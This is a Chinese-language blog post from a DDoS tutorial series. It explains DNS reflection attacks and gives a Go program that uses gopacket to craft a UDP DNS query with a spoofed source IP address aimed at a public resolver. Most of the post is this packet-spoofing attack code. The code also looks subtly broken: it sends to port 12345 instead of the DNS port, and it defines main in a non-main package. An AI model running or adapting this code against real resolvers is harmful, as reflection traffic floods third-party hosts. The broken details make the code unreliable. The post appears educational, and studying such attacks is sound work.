---
author: Sunny Tsai
title: "[Day 17] 閑著沒事 - DNS反射攻擊"
date: 2023-09-30
math: true
tags: [
    "cloud",
    "dns reflect",
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# DNS反射攻擊

## 攻擊手法
攻擊者向反射服務器發送解析DNS request，反射服務器向目標主機發送大量的DNS response回覆給目標主機，造成攻擊者只要發送一點流量就能使目標主機收到大量的無意義的封包流量攻擊。


## 原理
DNS反射攻擊的原理是一種提供查詢並回覆查詢的方式，這是一種DNS設計上的缺陷。攻擊者透過假查詢及假來源向反射服務器發送封包，反射服務器依照假來源上面的IP位址向目標主機發送大量DNS response封包。

dnsReflect.go
```
package reflect

import (
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func main() {

	var (
		device      string = "bridge100"
		snapshotLen int32  = 1024
		promiscuous bool   = false
		err         error
		timeout     time.Duration = 10 * time.Second
		handle      *pcap.Handle
		buffer      gopacket.SerializeBuffer
		random      *rand.Rand
	)

	handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	random = rand.New(rand.NewSource(time.Now().UnixNano()))
	srcPort := layers.UDPPort(random.Intn(65535))
	dstPort := layers.UDPPort(12345)

	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00},
		DstMAC:       net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00},
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipLayer := &layers.IPv4{
		SrcIP:    net.IP{10, 211, 55, 3},
		DstIP:    net.IP{8, 8, 8, 8},
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
	}

	udpLayer := &layers.UDP{
		SrcPort: srcPort,
		DstPort: dstPort,
	}
	udpLayer.SetNetworkLayerForChecksum(ipLayer)

	// DNS query
	dnsQuery := []byte{
		0x00, 0x01, // Transaction ID
		0x01, 0x00, // Flags: Standard Query
		0x00, 0x01, // Questions
		0x00, 0x00, // Answers
		0x00, 0x00, // Authority
		0x00, 0x00, // Additional
		0x03, 'w', 'w', 'w', // QNAME: www     # 以www.example.com dns為例，我手上沒有dns可以查詢
		0x05, 'e', 'x', 'a', 'm', 'p', 'l', 'e', // QNAME: example
		0x03, 'c', 'o', 'm', // QNAME: com
		0x00,       // Null terminator of QNAME
		0x00, 0x01, // QTYPE: A (IPv4 address)
		0x00, 0x01, // QCLASS: IN (Internet)
	}

	payload := dnsQuery

	buffer = gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload)); err != nil {
		log.Fatal(err)
	}
	udpPacket := buffer.Bytes()

	err = handle.WritePacketData(udpPacket)
	if err != nil {
		log.Fatal(err)
	}
}
```
